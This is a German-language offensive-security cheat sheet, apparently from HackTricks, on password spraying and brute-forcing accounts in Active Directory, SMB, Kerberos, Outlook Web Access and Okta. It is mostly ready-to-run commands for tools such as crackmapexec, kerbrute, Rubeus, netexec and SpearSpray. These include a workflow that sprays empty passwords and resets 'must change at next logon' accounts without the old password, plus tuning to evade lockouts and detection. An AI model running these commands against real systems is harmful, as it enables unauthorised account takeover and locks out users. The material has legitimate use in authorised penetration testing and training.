# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Sobald Sie mehrere **valid usernames** gefunden haben, können Sie bei jedem der entdeckten Benutzer die häufigsten **common passwords** ausprobieren (berücksichtigen Sie dabei die **password policy** der Umgebung).\
By **default** the **minimum** **password** **length** is **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Beachten Sie, dass Sie **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Get password policy

Wenn Sie über user credentials oder eine shell als domain user verfügen, können Sie **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Ausnutzung von Linux (oder allgemein)

- Verwendung von **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Verwendung von [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(du kannst die Anzahl der Versuche angeben, um Sperrungen zu vermeiden):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Verwendung von [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NICHT EMPFOHLEN; FUNKTIONIERT MANCHMAL NICHT
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Mit dem `scanner/smb/smb_login` Modul von **Metasploit**:

![](<../../images/image (745).png>)

- Mit **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Unter Windows

- Mit der [Rubeus](https://github.com/Zer1t0/Rubeus)-Version mit dem brute-Modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Mit [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Es kann standardmäßig Benutzer aus der Domäne generieren, die Passwortrichtlinie der Domäne abrufen und die Versuche entsprechend einschränken):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Mit [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifizieren und Übernehmen von "Password must change at next logon" Konten (SAMR)

Eine geräuscharme Technik besteht darin, ein harmloses/leeres Passwort zu sprayen und Konten zu erfassen, die STATUS_PASSWORD_MUST_CHANGE zurückgeben. Das weist darauf hin, dass das Passwort zwangsweise abgelaufen ist und ohne Kenntnis des alten Passworts geändert werden kann.

Workflow:
- Benutzer enumerieren (RID brute via SAMR), um die Zielliste aufzubauen:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray ein leeres Passwort und mache bei hits weiter, um accounts zu erfassen, die beim next logon ihr Passwort ändern müssen:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Für jeden Treffer das Passwort über SAMR mit NetExec’s module ändern (kein altes Passwort erforderlich, wenn "must change" gesetzt ist):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Betriebliche Hinweise:
- Stellen Sie sicher, dass die Systemzeit Ihres Hosts vor Kerberos-basierten Operationen mit dem DC synchronisiert ist: `sudo ntpdate <dc_fqdn>`.
- Ein [+] ohne (Pwn3d!) in einigen Modulen (z. B. RDP/WinRM) bedeutet, dass die creds gültig sind, aber das Konto keine Rechte für interaktives Anmelden besitzt.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying mit LDAP targeting und PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying reduziert Rauschen im Vergleich zu SMB/NTLM/LDAP bind-Versuchen und passt besser zu AD lockout policies. SpearSpray koppelt LDAP-driven targeting, eine pattern engine und policy awareness (domain policy + PSOs + badPwdCount buffer), um präzise und sicher zu sprayen. Es kann auch kompromittierte principals in Neo4j für BloodHound pathing taggen.

Key ideas:
- LDAP user discovery mit Paging und LDAPS-Unterstützung, optional mit custom LDAP-Filtern.
- Domain lockout policy + PSO-aware filtering, um einen konfigurierbaren Attempt-Buffer (threshold) zu belassen und Lockouts von Benutzern zu vermeiden.
- Kerberos pre-auth Validation mittels schneller gssapi bindings (erzeugt 4768/4771 auf DCs statt 4625).
- Pattern-basierte, pro-user Passwortgenerierung mit Variablen wie Namen und zeitlichen Werten, abgeleitet aus dem pwdLastSet jedes Benutzers.
- Throughput-Kontrolle mit threads, jitter und max requests pro Sekunde.
- Optionale Neo4j-Integration, um owned users für BloodHound zu markieren.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Zielausrichtung und Musterkontrolle:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth- und Sicherheitskontrollen:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound Anreicherung:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Übersicht über das Pattern-System (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Verfügbare Variablen umfassen:
- {name}, {samaccountname}
- Zeitbezogen aus pwdLastSet (oder whenCreated) jedes Benutzers: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Kompositionshelfer und Organisations-Token: {separator}, {suffix}, {extra}

Betriebliche Hinweise:
- Bevorzugen Sie das Abfragen des PDC-emulators mit -dc, um den autoritativsten badPwdCount und policy-bezogene Informationen auszulesen.
- Resets von badPwdCount werden beim nächsten Versuch nach dem Beobachtungsfenster ausgelöst; verwenden Sie Schwellenwerte und Timing, um sicher zu bleiben.
- Kerberos pre-auth attempts erscheinen als 4768/4771 in DC-Telemetrie; verwenden Sie Jitter und Rate-Limiting, um sich anzupassen.

> Tipp: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Es gibt mehrere Tools für p**assword spraying outlook**.

- Mit [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Mit [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Mit [Ruler](https://github.com/sensepost/ruler) (zuverlässig!)
- Mit [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Mit [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Um eines dieser Tools zu verwenden, benötigen Sie eine Benutzerliste und ein password bzw. eine kleine Liste von passwords, die gesprüht werden sollen.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referenzen

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
